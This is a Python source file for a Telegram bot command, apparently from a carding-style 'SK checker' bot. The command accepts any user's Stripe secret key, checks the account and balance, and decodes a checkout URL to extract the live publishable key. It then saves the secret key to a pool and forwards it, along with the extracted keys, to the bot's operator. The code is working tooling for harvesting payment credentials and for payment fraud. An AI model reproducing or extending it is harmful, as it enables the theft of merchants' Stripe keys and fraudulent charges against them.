import base64
import json
import httpx
import stripe
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from TOOLS.check_all_func import *
from FUNC.defs import *


stripe.api_key = ""


@Client.on_message(filters.command("setsk", [".", "/"]))
async def skTopk(Client, message):
    try:
        user_id     = str(message.from_user.id)
#         OWNER_ID    = json.loads(open("FILES/config.json", "r" , encoding="utf-8").read())["OWNER_ID"]
#         if user_id not in OWNER_ID:
#             resp = """<b>You Don't Have Permission To Use This Command.    
# Contact Bot Owner @SPYxSPYDE !</b>"""
#             await message.reply_text(resp, message.id)
#             return
        checkall = await check_all_thing(Client, message)

        if len(message.text.split()) == 1:
            resp = """<b>
𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐒𝐊 ⚠️

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 𝐀𝐧𝐲 𝐕𝐚𝐥𝐢𝐝 𝐒𝐊 𝐅𝐫𝐨𝐦 𝐘𝐨𝐮𝐫 𝐈𝐧𝐩𝐮𝐭.
            </b>"""
            await message.reply_text(resp, message.id)
            return

        try:
            sk = str(message.text.split(" ")[1])
        except:
            sk = message.reply_to_message.from_user.id

            resp = """<b>
𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐒𝐊 ⚠️

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 𝐀𝐧𝐲 𝐕𝐚𝐥𝐢𝐝 𝐒𝐊 𝐅𝐫𝐨𝐦 𝐘𝐨𝐮𝐫 𝐈𝐧𝐩𝐮𝐭.
            </b>"""
            await message.reply_text(resp, message.id)
            return

        try:
            stripe.api_key = sk

            session = httpx.AsyncClient()
            try:
                headers = {
                    "Authorization": f"Bearer {sk}"
                }
                # Fetch SK info
                skinfo_response = await session.get("https://api.stripe.com/v1/account", headers=headers)
                skinfo = skinfo_response.json()

                # Fetch balance info
                balance_response = await session.get("https://api.stripe.com/v1/balance", headers=headers)
                balance_info = balance_response.json()
            except Exception as e:
                await error_log(str(e))





            checkout_url = create_checkout_session()

            pk = await get_stripe_data(checkout_url)




            skinfo = stripe.Account.retrieve()

            charges_enabled = skinfo['charges_enabled']
            card_payment = skinfo['capabilities']['card_payments']

            if "inactive" in card_payment:
                    resp = """<b>
𝐒𝐊 𝐊𝐞𝐲 𝐄𝐱𝐩𝐢𝐫𝐞𝐝 ⚠️

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐘𝐨𝐮𝐫 𝐒𝐊 𝐤𝐞𝐲 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝. 𝐏𝐥𝐞𝐚𝐬𝐞 𝐨𝐛𝐭𝐚𝐢𝐧 𝐚 𝐧𝐞𝐰 𝐒𝐊 𝐤𝐞𝐲.
                    </b>"""
      
                    await message.reply_text(resp, message.id)
                    return

            currency = skinfo['default_currency'].upper()
            livemode = balance_info['livemode']

            available_balance = balance_info.get("available", [{}])[0].get("amount", "N/A")
            pending_balance = balance_info.get("pending", [{}])[0].get("amount", "N/A")

            if charges_enabled:
                await addsk(sk)

        except stripe.error.StripeError as e:
            await error_log(f"Stripe Error: {e}")
            resp = """<b>
𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐒𝐤 𝐢𝐧𝐟𝐨 ⚠️

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐔𝐧𝐚𝐛𝐥𝐞 𝐭𝐨 𝐟𝐞𝐭𝐜𝐡 𝐒𝐤 𝐢𝐧𝐟𝐨. 𝐂𝐡𝐞𝐜𝐤 𝐢𝐟 𝐭𝐡𝐞 𝐒𝐊 𝐢𝐬 𝐋𝐢𝐯𝐞.
            </b>"""
            await message.reply_text(resp, message.id)
            return
        except Exception as e:
            await error_log(f"Error: {e}")
            resp = """<b>
𝐄𝐫𝐫𝐨𝐫 𝐟𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐒𝐤 𝐢𝐧𝐟𝐨 ⚠️

𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐔𝐧𝐚𝐛𝐥𝐞 𝐭𝐨 𝐟𝐞𝐭𝐜𝐡 𝐒𝐤 𝐢𝐧𝐟𝐨. 𝐂𝐡𝐞𝐜𝐤 𝐢𝐟 𝐭𝐡𝐞 𝐒𝐊 𝐢𝐬 𝐋𝐢𝐯𝐞.
            </b>"""
            await message.reply_text(resp, message.id)
            return

        PK_KEY = pk
        full_pk ="pk_live_"+pk
        session = httpx.AsyncClient(timeout=10)


        await updateuserinfo(user_id, "dsk", sk)
        await updateuserinfo(user_id, "dpk", full_pk)
        await updateuserinfo(user_id, "dcr", currency)



        resp = f"""<b>
𝐒𝐊 𝐎𝐑 𝐏𝐊 𝐒𝐄𝐓 ✅
━━━━━━━━━━━━━━ 
𝐒𝐊:➺ <code>{sk}</code>

𝐏𝐊:➺ <code>{full_pk}</code>

𝐂𝐮𝐫𝐫𝐞𝐧𝐜𝐲:➺ <code>{currency}</code>
━━━━━━━━━━━━━━ 
</b>"""
        await message.reply_text(resp, message.id)

        await addsk(sk)
        await sendsk(resp, session)

    except Exception as e:
        import traceback
        await error_log(traceback.format_exc())


def create_checkout_session():
    try:
        session = stripe.checkout.Session.create(
            payment_method_types=['card'],
            line_items=[
                {
                    'price_data': {
                        'currency': 'usd',
                        'product_data': {
                            'name': 'Awesome Product',
                        },
                        'unit_amount': 100,
                    },
                    'quantity': 1,
                },
            ],
            mode='payment',
            success_url='https://your-website.com/success',
            cancel_url='https://your-website.com/cancel',
        )
        return session.url
    except:
        pass


async def get_stripe_data(checkout_url):
    try:
        url = checkout_url.split('#')[1]
        encoded_url = url.replace('%2B', '+').replace('%2F', '/')
        encoded_url += '=' * (len(encoded_url) % 4)
        decoded_bytes = base64.urlsafe_b64decode(encoded_url)
        decoded_url = decoded_bytes.decode('utf-8')
        key = 5
        binary_key = bin(key)[2:].zfill(8)
        plaintext = ""
        for i in range(len(decoded_url)):
            binary_char = bin(ord(decoded_url[i]))[2:].zfill(8)
            xor_result = ""
            for j in range(8):
                xor_result += str(int(binary_char[j]) ^ int(binary_key[j]))
            plaintext += chr(int(xor_result, 2))
        pk = plaintext.split('pk_live_')[1].split('"')[0]
        return pk
    except:
        pass
